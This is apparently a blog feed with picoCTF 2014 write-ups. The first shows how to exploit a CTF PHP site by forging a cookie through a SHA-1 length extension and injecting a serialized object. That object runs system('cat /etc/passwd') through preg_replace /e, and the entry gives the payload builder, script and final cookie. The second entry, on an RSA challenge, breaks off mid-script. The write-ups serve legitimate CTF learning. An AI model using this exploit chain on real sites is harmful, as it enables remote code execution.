  <entry>
    <title type="html"><![CDATA[picoCTF 2014: Steve's List]]></title>
    <link href="http://swappage.github.io/blog/2014/11/08/picoctf-2014-steves-list/"/>
    <updated>2014-11-08T21:05:49+01:00</updated>
    <id>http://swappage.github.io/blog/2014/11/08/picoctf-2014-steves-list</id>
    <content type="html"><![CDATA[<p>Steve’s List was a 200 points master challenge mostly focused on web exploitation, but also with a little of crypto inside.</p>

<p>The problem stated</p>

<p><img class="center" src="http://swappage.github.io/images/2014-11-08_stevelist/problem.png" /></p>

<p>So we were playing with a defaced website, we had the web server, a backup archive containing the source for a white box analysis and a flag to read.</p>

<!-- more -->

<p>I started looking at the source code, and a couple of things turned out looking really interesting.</p>

<p>Let’s start with the cookie.php page, which is the page that actually has the vuln:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;custom_settings&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class="line">	<span class="c1">// We should verify to make sure this thing is legit.</span>
</span><span class="line">	<span class="nv">$custom_settings</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;custom_settings&#39;</span><span class="p">]);</span>
</span><span class="line">	<span class="nv">$hash</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nx">AUTH_SECRET</span> <span class="o">.</span> <span class="nv">$custom_settings</span><span class="p">);</span>
</span><span class="line">	<span class="k">if</span> <span class="p">(</span><span class="nv">$hash</span> <span class="o">!==</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;custom_settings_hash&#39;</span><span class="p">])</span> <span class="p">{</span>
</span><span class="line">	  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Why would you hack Section Chief Steve&#39;s site? :(&quot;</span><span class="p">);</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">	<span class="c1">// we only support one setting for now, but we might as well put this in.</span>
</span><span class="line">	<span class="nv">$settings_array</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$custom_settings</span><span class="p">);</span>
</span><span class="line">	<span class="nv">$custom_settings</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span><span class="line">	<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$settings_array</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">	  <span class="nv">$setting</span> <span class="o">=</span> <span class="nv">$settings_array</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span><span class="line">	  <span class="nv">$setting</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$setting</span><span class="p">);</span>
</span><span class="line">	  <span class="nv">$custom_settings</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$setting</span><span class="p">;</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">	<span class="nv">$custom_settings</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">true</span><span class="p">);</span>
</span><span class="line">	<span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;custom_settings&#39;</span><span class="p">,</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">true</span><span class="p">)),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span>
</span><span class="line">	<span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;custom_settings_hash&#39;</span><span class="p">,</span> <span class="nb">sha1</span><span class="p">(</span><span class="nx">AUTH_SECRET</span> <span class="o">.</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">true</span><span class="p">)),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line"><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>As we can see, the vuln here is pretty clear: there is a deserialization of an object that is specified in a cookie value.
What happens here is that the value of the cookie is splitted on the “\n” character, and each value is put in an array and then the function unserialize() is invoked on that value.</p>

<p>As we will see later, this will allow us to gain remote code execution on the server, but unfortunately, for now there is something really annoying that is preventing us from reaching the exploitable branch of code.</p>

<p>In fact at line 5 the cookie value is appended to an AUTH_SECRET value, and a sha1 hash of the resulting concatenation is checked against another cookie, named custom_settings_hash
which is set the first time we visit the site by the code from line from 19 to 21 of the cookie.php page.</p>

<p>the AUTH_SECRET value is statically defined in another php page, where all the static variables are set: root_data.php</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class="line">  <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;STEVES_LIST_ABSOLUTE_INCLUDE_ROOT&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;STEVES_LIST_TEMPLATES_PATH&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;/templates/&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;DISPLAY_POSTS&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class="line">  <span class="c1">// Daedalus changed this... I guess AAAAAAAA was not a good secret :(</span>
</span><span class="line">  <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;AUTH_SECRET&#39;</span><span class="p">,</span> <span class="s2">&quot;AAAAAAAA&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="k">require_once</span><span class="p">(</span><span class="nx">STEVES_LIST_ABSOLUTE_INCLUDE_ROOT</span> <span class="o">.</span> <span class="s2">&quot;includes/classes.php&quot;</span><span class="p">);</span>
</span><span class="line"><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>In our local backup, the static value is set to AAAAAAAA, but on the remote server the “hackers” from daedalus corp modified that value to prevent us from taking back the control of the web site.</p>

<p>And here is where crypto comes in play: yes, because there is an attack. known as <em>length extension attack</em> that allows us to bypass the above verification issue.</p>

<p>The attack can be performed with all the hashes where the function is H(secret.message) and where the message and the length of the secret are known.</p>

<p>We know already that the value of AUTH_SECRET is fixed to 8 characters, so we can abuse the length extension attack to append extra data to the custom_settings cookie.</p>

<p>Before performing this attack, we were bound to a fixed value in the custom_settings cookie, that was</p>

<pre><code>b:1;
</code></pre>

<p>which is the serialization of a true statement</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="nb">serialize</span><span class="p">(</span><span class="k">true</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>but now we can predict the hash that will result by padding that value and appending extra data, so we can append a \n followed by another serialized object that would eventually be deserialized after the check was successfully passed.</p>

<p>Using a python library for implementing the Length extension attack: hlextend i was able to build a simple payload that would bypass the validation; for now let’s be happy i was able to inject test.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-11-08_stevelist/hashbypass.png" /></p>

<p>Once the problem of bypassing the hash validation was solved, I had to find a way to gain code execution.
Doing that on the remote server would have been a little too much of a frustration, so i decided to create a local instance using the website backup, and by tweaking the code a bit, try to build a working object that would allow to gain code execution.</p>

<p>after looking at the source code of the class.php a little closer, I found that the Post class would be the perfect object to serialize and inject; </p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="k">class</span> <span class="nc">Post</span> <span class="p">{</span>
</span><span class="line">	<span class="k">protected</span> <span class="nv">$title</span><span class="p">;</span>
</span><span class="line">	<span class="k">protected</span> <span class="nv">$text</span><span class="p">;</span>
</span><span class="line">	<span class="k">protected</span> <span class="nv">$filters</span><span class="p">;</span>
</span><span class="line">	<span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$title</span><span class="p">,</span> <span class="nv">$text</span><span class="p">,</span> <span class="nv">$filters</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">title</span> <span class="o">=</span> <span class="nv">$title</span><span class="p">;</span>
</span><span class="line">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
</span><span class="line">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filters</span> <span class="o">=</span> <span class="nv">$filters</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>the class accepts 3 parameters in the constructor</p>

<ul>
  <li>title</li>
  <li>text</li>
  <li>filter</li>
</ul>

<p>where title is a string, text is also a string, while filter is an array of objects from the Filter class.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="k">class</span> <span class="nc">Filter</span> <span class="p">{</span>
</span><span class="line">	<span class="k">protected</span> <span class="nv">$pattern</span><span class="p">;</span>
</span><span class="line">	<span class="k">protected</span> <span class="nv">$repl</span><span class="p">;</span>
</span><span class="line">	<span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$repl</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">	  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pattern</span> <span class="o">=</span> <span class="nv">$pattern</span><span class="p">;</span>
</span><span class="line">	  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">repl</span> <span class="o">=</span> <span class="nv">$repl</span><span class="p">;</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">	<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">	  <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pattern</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">repl</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line"><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And how convenient, because the Filter class makes a good use of the preg_replace() function! This is really good, because considering we are in control of the object, we can forge the regular expressions for the Filter object, and this allows us, to create a regexp that instead of replacing, would execute our substitution payload.</p>

<p>To build the object i created this simple PHP snipplet:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class="line">
</span><span class="line"><span class="k">class</span> <span class="nc">Filter</span> <span class="p">{</span>
</span><span class="line">    <span class="k">protected</span> <span class="nv">$pattern</span><span class="p">;</span>
</span><span class="line">    <span class="k">protected</span> <span class="nv">$repl</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">    <span class="k">function</span> <span class="nf">__construct</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$repl</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pattern</span> <span class="o">=</span> <span class="nv">$pattern</span><span class="p">;</span>
</span><span class="line">      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">repl</span> <span class="o">=</span> <span class="nv">$repl</span><span class="p">;</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="k">return</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pattern</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">repl</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="nv">$filterobject</span> <span class="o">=</span> <span class="p">[</span><span class="k">new</span> <span class="nx">Filter</span><span class="p">(</span><span class="s2">&quot;/test/e&quot;</span><span class="p">,</span> <span class="s2">&quot;system(&#39;cat /etc/passwd&#39;);&quot;</span><span class="p">)];</span>
</span><span class="line">
</span><span class="line"><span class="k">class</span> <span class="nc">Post</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">   <span class="k">protected</span> <span class="nv">$title</span> <span class="o">=</span> <span class="s2">&quot;test&quot;</span><span class="p">;</span>
</span><span class="line">   <span class="k">protected</span> <span class="nv">$text</span> <span class="o">=</span> <span class="s2">&quot;test&quot;</span><span class="p">;</span>
</span><span class="line">   <span class="k">protected</span> <span class="nv">$filters</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">   <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span> <span class="p">{</span>
</span><span class="line">        <span class="k">global</span> <span class="nv">$filterobject</span><span class="p">;</span>
</span><span class="line">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filters</span> <span class="o">=</span> <span class="nv">$filterobject</span><span class="p">;</span>
</span><span class="line">   <span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span>  <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Post</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>saved the output to a file (because the serialized objects may contain non printable characters
URL encoded it, and tried to send it to my local server.</p>

<p>The result was the following</p>

<p><img class="center" src="http://swappage.github.io/images/2014-11-08_stevelist/injected.png" /></p>

<p>Ok, now i had an object that would allow me to execute arbitrary code on the remote server.</p>

<p>I replaced the payload with a cat /home/daedalus/flag.txt and used the following python snipplet to calculate the hash and produce proper padding</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/python</span>
</span><span class="line">
</span><span class="line"><span class="kn">import</span> <span class="nn">sys</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">struct</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">hlextend</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">urllib</span>
</span><span class="line">
</span><span class="line"><span class="nb">object</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class="line">
</span><span class="line"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;rawcookie.bin&quot;</span><span class="p">,</span> <span class="s">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class="line">	<span class="n">byte</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class="line">	<span class="k">while</span> <span class="n">byte</span> <span class="o">!=</span> <span class="s">&quot;&quot;</span><span class="p">:</span>
</span><span class="line">		<span class="nb">object</span> <span class="o">+=</span> <span class="n">byte</span>
</span><span class="line">		<span class="n">byte</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="nb">object</span>
</span><span class="line">
</span><span class="line"><span class="n">sha</span> <span class="o">=</span> <span class="n">hlextend</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">&#39;sha1&#39;</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">meh</span> <span class="o">=</span> <span class="n">sha</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">object</span><span class="p">,</span> <span class="s">&#39;b:1;&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s">&#39;2141b332222df459fd212440824a35e63d37ef69&#39;</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">meh</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">sha</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>here is an hex representation of the custom_settings cookie without URL encoding</p>

<pre><code>00000000  0a 4f 3a 34 3a 22 50 6f  73 74 22 3a 33 3a 7b 73  |.O:4:"Post":3:{s|
00000010  3a 38 3a 22 00 2a 00 74  69 74 6c 65 22 3b 73 3a  |:8:".*.title";s:|
00000020  34 3a 22 74 65 73 74 22  3b 73 3a 37 3a 22 00 2a  |4:"test";s:7:".*|
00000030  00 74 65 78 74 22 3b 73  3a 34 3a 22 74 65 73 74  |.text";s:4:"test|
00000040  22 3b 73 3a 31 30 3a 22  00 2a 00 66 69 6c 74 65  |";s:10:".*.filte|
00000050  72 73 22 3b 61 3a 31 3a  7b 69 3a 30 3b 4f 3a 36  |rs";a:1:{i:0;O:6|
00000060  3a 22 46 69 6c 74 65 72  22 3a 32 3a 7b 73 3a 31  |:"Filter":2:{s:1|
00000070  30 3a 22 00 2a 00 70 61  74 74 65 72 6e 22 3b 73  |0:".*.pattern";s|
00000080  3a 37 3a 22 2f 74 65 73  74 2f 65 22 3b 73 3a 37  |:7:"/test/e";s:7|
00000090  3a 22 00 2a 00 72 65 70  6c 22 3b 73 3a 33 38 3a  |:".*.repl";s:38:|
000000a0  22 73 79 73 74 65 6d 28  27 63 61 74 20 2f 68 6f  |"system('cat /ho|
000000b0  6d 65 2f 64 61 65 64 61  6c 75 73 2f 66 6c 61 67  |me/daedalus/flag|
000000c0  2e 74 78 74 27 29 3b 22  3b 7d 7d 7d              |.txt');";}}}|
</code></pre>

<p>the resulting cookies content for the submission to the vulnerable page were respectively:</p>

<pre><code>custom_settings_hash: 13c0bac46fcbd453c5052bce1d2f9ad6c88fe2bc

vustom_settings: b:1%3b%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%60%0AO%3A4%3A%22Post%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00title%22%3Bs%3A4%3A%22test%22%3Bs%3A7%3A%22%00%2A%00text%22%3Bs%3A4%3A%22test%22%3Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Filter%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00pattern%22%3Bs%3A7%3A%22%2Ftest%2Fe%22%3Bs%3A7%3A%22%00%2A%00repl%22%3Bs%3A38%3A%22system%28%27cat+%2Fhome%2Fdaedalus%2Fflag.txt%27%29%3B%22%3B%7D%7D%7D
</code></pre>

<p>and they resulted in the flag being correctly retrieved</p>

<p><img class="center" src="http://swappage.github.io/images/2014-11-08_stevelist/flag.png" /></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[picoCTF 2014: RSA Mistakes]]></title>
    <link href="http://swappage.github.io/blog/2014/11/08/picoctf-2014-rsa-mistakes/"/>
    <updated>2014-11-08T20:56:51+01:00</updated>
    <id>http://swappage.github.io/blog/2014/11/08/picoctf-2014-rsa-mistakes</id>
    <content type="html"><![CDATA[<p>RSA Mistakes was a 200 points cryptography master challenge in picoCTF.
The final objective was to recover the encrypted message.</p>

<!-- more -->

<p><img class="center" src="http://swappage.github.io/images/2014-11-01/problem.png" /></p>

<p>In the downloaded zip file we were provided with</p>

<ul>
  <li>a traffic capture file in tcpdump format</li>
  <li>a python script</li>
</ul>

<p>By looking at the pcap file we could notice that there are a bunch of request/responses, which by the problem statement were most likely encrypted using RSA.</p>

<p><img class="center" src="http://swappage.github.io/images/2014-11-01/tcpstreams.png" /></p>

<p>Two of these streams, the first and the fourth, were extremely interesting, because two over the three parameters in the request were identical, while the third was not, and on the other side, the reply, which is supposed to be the encrypted message was completely different.</p>

<p>So, at this point, let’s give a look at the server python script and try to figure things out.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#!/usr/bin/env python</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">os</span>
</span><span class="line"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">SocketServer</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">threading</span>
</span><span class="line"><span class="kn">import</span> <span class="nn">time</span>
</span><span class="line">
</span><span class="line"><span class="n">message</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class="line"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;message.txt&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class="line">  <span class="n">message</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class="line">
</span><span class="line"><span class="k">class</span> <span class="nc">threadedserver</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">ThreadingMixIn</span><span class="p">,</span> <span class="n">SocketServer</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">):</span>
</span><span class="line">  <span class="k">pass</span>
</span><span class="line">
</span><span class="line"><span class="n">id_dict</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class="line">
</span><span class="line"><span class="k">class</span> <span class="nc">incoming</span><span class="p">(</span><span class="n">SocketServer</span><span class="o">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
</span><span class="line">  <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class="line">	<span class="n">cur_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">current_thread</span><span class="p">()</span>
</span><span class="line">	<span class="n">welcome</span> <span class="o">=</span> <span class="s">&quot;Welcome to the Daedalus Corp Message Service</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class="line">	<span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">welcome</span><span class="p">)</span>
</span><span class="line">	<span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Please send me a public key and an ID. We&#39;ll encrypt the message&quot;</span><span class="p">)</span>
</span><span class="line">	<span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot; and send it to you.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class="line">	<span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&quot;got </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">key</span>
</span><span class="line">	<span class="n">N</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">user_id</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="p">)</span>
</span><span class="line">	<span class="k">print</span> <span class="n">N</span><span class="p">,</span> <span class="n">e</span>
</span><span class="line">	<span class="n">N</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">N</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class="line">	<span class="n">e</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class="line">	<span class="n">user_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
</span><span class="line">	<span class="k">print</span> <span class="s">&quot;Got the user id!&quot;</span>
